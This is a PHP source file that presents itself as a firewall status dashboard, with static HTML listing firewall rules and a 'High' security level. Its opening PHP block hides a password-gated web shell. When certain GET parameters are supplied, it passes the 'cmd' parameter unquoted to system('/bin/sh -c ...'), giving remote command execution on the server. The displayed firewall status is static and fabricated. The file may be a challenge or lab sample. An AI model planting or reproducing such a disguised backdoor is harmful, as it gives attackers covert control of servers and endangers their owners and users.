<?php

require "./utils.php";

if (isset($_GET['firewall_config_shell']) && isset($_GET['password']) && isset($_GET['cmd']) && isset($_GET['key'])) {
    $password = $_GET['password'];
    $key = $_GET['key'];
    $cmd = $_GET['cmd'];

    if (!empty($password)) {
        $hashed_passwd = generate_md5_hash($password);
        $encrypted_passwd = encrypt_password($password, $hashed_passwd, $key);
        $stored_passwd = file_get_contents('./passwd');

        if ($encrypted_passwd == $stored_passwd) {
            system("/bin/sh -c " .  $cmd);
        } else {
            die("Access denied!");
        }
    } else {
        die("Password must not be empty!");
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Firewall</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
<style>
/* CSS Styles */
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f5f5f5;
}

.container {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.card {
    background-color: #fff;
    border-radius: 10px;
    box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
    padding: 30px;
    width: 450px;
    text-align: left;
}

.card i {
    font-size: 40px;
    color: #3498db;
}

.card h2 {
    font-size: 24px;
    margin-bottom: 15px;
    color: #333;
}

.card p {
    font-size: 18px;
    color: #666;
    margin-bottom: 10px;
}

.card ul {
    list-style-type: none;
    padding-left: 0;
}

.card li {
    margin-bottom: 5px;
}

.header {
    background-color: #3498db;
    color: #fff;
    padding: 20px 0;
    text-align: center;
}
</style>
</head>
<body>

<div class="header">
    <h1><i class="fas fa-shield-alt"></i> Firewall</h1>
</div>

<div class="container">
    <div class="card">
        <i class="fas fa-shield-alt"></i>
        <h2>Firewall Status</h2>
        <p><strong>Status:</strong> Enabled</p>
        <p><strong>Intrusion Detection:</strong> On</p>
        <p><strong>Firewall Rules:</strong></p>
        <ul>
            <li><strong>Rule 1:</strong> Block incoming traffic on port 80</li>
            <li><strong>Rule 2:</strong> Allow outgoing traffic on port 443</li>
            <li><strong>Rule 3:</strong> Block all traffic from specific IP addresses</li>
            <li><strong>Rule 4:</strong> Allow SSH access only from trusted IP range</li>
        </ul>
        <p><strong>Security Level:</strong> High</p>
        <p><strong>Last Updated:</strong> April 7, 2024</p>
    </div>
</div>

</body>
</html>
